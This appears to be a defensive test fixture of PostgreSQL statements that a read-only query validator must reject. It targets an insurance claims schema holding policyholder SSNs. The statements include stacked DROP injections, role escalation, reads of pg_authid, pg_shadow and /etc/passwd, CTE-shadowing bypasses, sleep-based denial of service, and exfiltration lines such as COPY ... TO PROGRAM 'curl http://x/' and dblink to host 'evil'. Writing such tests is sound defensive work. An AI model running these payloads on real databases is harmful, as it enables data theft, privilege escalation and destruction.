-- Statements that check() must reject, split on each line that holds only two dashes, a space and next.
-- Each is either not a single read-only SELECT, names a relation off the allow-list or one no CTE in
-- scope covers, names a type off the allow-list, uses WITH RECURSIVE, calls a function off the
-- allow-list, or fails to parse. None should reach the database.

INSERT INTO core.claims (claim_id) VALUES (1)
-- next
UPDATE core.claims SET reserve = 0
-- next
DELETE FROM core.payments
-- next
MERGE INTO core.claims c USING core.claims s ON c.claim_id = s.claim_id WHEN MATCHED THEN DELETE
-- next
CREATE TABLE public.scratch (x int)
-- next
DROP TABLE core.claims
-- next
ALTER TABLE core.claims DISABLE ROW LEVEL SECURITY
-- next
TRUNCATE core.payments
-- next
GRANT SELECT ON core.policyholders TO PUBLIC
-- next
SELECT 1; DROP TABLE core.claims
-- next
SELECT 1 FROM sem.v_claims; UPDATE core.claims SET reserve = 0
-- next
SET ROLE chat_supervisor
-- next
SET SESSION AUTHORIZATION u_supervisor
-- next
SELECT set_config('role', 'u_supervisor', false)
-- next
SELECT set_config('statement_timeout', '0', false)
-- next
SELECT current_setting('is_superuser')
-- next
SELECT pg_sleep(10)
-- next
SELECT * FROM pg_sleep(10)
-- next
SELECT pg_sleep_for('10 seconds')
-- next
SELECT rolname, rolpassword FROM pg_catalog.pg_authid
-- next
SELECT * FROM pg_roles
-- next
SELECT usename, passwd FROM pg_shadow
-- next
SELECT table_name FROM information_schema.tables
-- next
SELECT schemaname FROM pg_catalog.pg_tables
-- next
WITH v_claims AS (SELECT * FROM pg_roles) SELECT * FROM v_claims
-- next
WITH "sem.v_claims" AS (SELECT rolname AS region FROM pg_roles) SELECT * FROM "sem.v_claims"
-- next
WITH v_payments_net AS (SELECT ssn AS amount FROM core.policyholders) SELECT * FROM v_payments_net
-- next
SELECT claim_id INTO scratch FROM sem.v_claims
-- next
COPY (SELECT ssn FROM core.policyholders) TO PROGRAM 'curl http://x/'
-- next
COPY core.policyholders TO STDOUT
-- next
SELECT lo_import('/etc/passwd')
-- next
SELECT lo_export(1, '/tmp/out')
-- next
SELECT dblink('host=evil', 'SELECT ssn FROM core.policyholders')
-- next
SELECT * FROM sem.v_claims FOR UPDATE
-- next
SELECT * FROM sem.v_claims FOR NO KEY UPDATE SKIP LOCKED
-- next
SELECT claim_id::text FROM sem.v_claims UNION SELECT ssn FROM core.policyholders
-- next
SELECT claim_id FROM sem.v_claims WHERE claim_id IN (SELECT claim_id FROM core.claims)
-- next
SELECT (SELECT ssn FROM core.policyholders ORDER BY policyholder_id LIMIT 1) AS x FROM sem.v_claims
-- next
SELECT /* sneak */ ssn FROM core.policyholders -- trailing comment
-- next
SELECT * FROM sem.v_claims /* ok */ WHERE 1 = 1; DROP TABLE core.claims
-- next
SELECT * FROM core.claims WHERE region = 'West'
-- next
ＳＥＬＥＣＴ 1 FROM sem.v_claims
-- next
EXPLAIN ANALYZE SELECT * FROM core.claims
-- next
DO $$ BEGIN PERFORM set_config('role', 'u_supervisor', false); END $$
-- next
CALL some_procedure()
-- next
LISTEN claims_channel
-- next
NOTIFY claims_channel, 'exfil'
-- next
SELECT pg_notify('claims_channel', 'exfil')
-- next
PREPARE steal AS SELECT ssn FROM core.policyholders
-- next
EXECUTE steal
-- next
SELECT pg_advisory_lock(42)
-- next
SELECT pg_advisory_xact_lock(42)
-- next
SELECT pg_logical_emit_message(false, 'prefix', 'payload')
-- next
SELECT txid_current()
-- next
SELECT pg_read_file('/etc/passwd')
-- next
SELECT pg_ls_dir('/')
-- next
SELECT query_to_xml('SELECT ssn FROM core.policyholders', true, false, '')
-- next
SELECT ctid, xmin FROM sem.v_claims
-- next
VALUES (1), (2)
-- next
SELECT 'pg_authid'::regclass
-- next
SELECT CAST('pg_sleep' AS regproc)
-- next
SELECT TRY_CAST('u_supervisor' AS regrole)
-- next
SELECT regclass 'pg_shadow'
-- next
SELECT 'pg_catalog'::regnamespace::oid
-- next
SELECT claim_id::oid::regclass FROM sem.v_claims
-- next
SELECT 'pg_authid'::pg_catalog.regclass
-- next
SELECT '{pg_authid,pg_shadow}'::regclass[]
-- next
SELECT '<x/>'::xml
-- next
SELECT '{"a": 1}'::jsonb
-- next
WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 100000) SELECT count(*) FROM r
-- next
SELECT n FROM (WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r) SELECT n FROM r LIMIT 5) AS s
-- next
SELECT r.rolname FROM (WITH pg_roles AS (SELECT 1 AS x) SELECT x FROM pg_roles) AS s CROSS JOIN pg_roles AS r
-- next
SELECT rolname FROM pg_roles WHERE EXISTS (WITH pg_roles AS (SELECT 1) SELECT 1 FROM pg_roles)
-- next
WITH a AS (SELECT rolname FROM pg_roles), pg_roles AS (SELECT 1 AS rolname) SELECT rolname FROM a
-- next
WITH pg_roles AS (SELECT rolname FROM pg_roles) SELECT rolname FROM pg_roles
-- next
WITH "PG_ROLES" AS (SELECT 1 AS rolname) SELECT rolname FROM pg_roles
-- next
SELECT claim_id FROM (WITH v_claims AS (SELECT ssn AS claim_id FROM core.policyholders) SELECT claim_id FROM v_claims) AS s
-- next
WITH pg_locKs AS (SELECT 1 AS x) SELECT * FROM pg_locks
-- next
SELECT PARSE_JSON('{"x": 1}') AS j
-- next
SELECT JSON_OBJECT('k' VALUE region RETURNING jsonb) FROM sem.v_claims
-- next
SELECT JSON_OBJECT('k' VALUE region RETURNING regclass) FROM sem.v_claims
-- next
SELECT version()
-- next
SELECT current_user
-- next
SELECT session_user
-- next
SELECT md5(claim_id::text) FROM sem.v_claims
-- next
SELECT string_agg(claim_id::text, ',') FROM sem.v_claims
-- next
SELECT count(*) FROM generate_series(1, 100000) AS g
-- next
SELECT xmlelement(NAME claim, claim_id) FROM sem.v_claims
-- next
SELECT json_object('claim' VALUE claim_id) FROM sem.v_claims
-- next
SELECT u FROM unnest(ARRAY[1, 2, 3]) AS u
-- next
SELECT * FROM pg_read_file('/etc/passwd') AS f
-- next
WITH s AS (SELECT pg_sleep(10) AS x) SELECT x FROM s
